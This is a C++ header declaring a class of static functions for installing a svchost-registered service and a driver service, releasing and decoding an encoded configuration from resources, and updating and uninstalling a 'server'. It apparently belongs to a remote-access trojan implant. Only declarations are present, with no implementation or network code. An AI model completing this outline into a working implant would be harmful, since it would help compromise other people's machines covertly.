// MyCommon.h: interface for the MyCommon class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_)
#define AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_

#include "Public.h"

class MyCommon  
{
public:
	static DWORD WINAPI MY_INSTALL(LPVOID lparam);
	static	BOOL	SetSvcHostReg(LPCSTR lpDstFileName,DWORD dwFlags);

public:
	MyCommon();
	virtual ~MyCommon();

public:
	static	int		pos(char c);
	static	int		base64_decode(const char *str, char **data);

	static	char*	MyDecode(char *str);
	static	BOOL	ReleaseResource( WORD wResourceID, LPCSTR lpType, LPCSTR lpFileName, PCHAR lpConfigString );
	static	LPBYTE	FindConfigString( WORD wResourceID, LPCSTR lpType );
	//static	void	StartService(LPCSTR lpService);

	static  BOOL	CALLBACK CommEnumWindowsProc(HWND hWnd, LPARAM lParam);
	static BOOL  InstallService(LPCSTR lpServiceDisplayName, LPCSTR lpDriverPath,CHAR *szDeviceName);
	static BOOL		IsServerStart(CHAR *szDeviceName);
	static DWORD WINAPI UpdateServer(LPSTR lpFileBakName, LPSTR lpFileSelfName);
	static DWORD WINAPI Uninstall(LPSTR lpBakFile, LPSTR lpSelfFile);
	static BOOL CALLBACK CommRegWindowsProc(HWND hWnd, LPARAM lParam);

public:
	enum{MAX_CONFIG_LEN	= 1024};
	static	char	EncodeString[MAX_CONFIG_LEN];
	static	char	ServiceConfig[MAX_CONFIG_LEN];
	static  char    szDllPath[MAX_PATH];
	static	char	szServerName[32];
	static	char	szServerDesName[MAX_PATH];
	static	char	szServerDescription[MAX_CONFIG_LEN];

private:
	static	char	base64[100];
	static CHAR	m_InstallName[32];
	static int m_nRegDlgCount;
};

#endif // !defined(AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_)
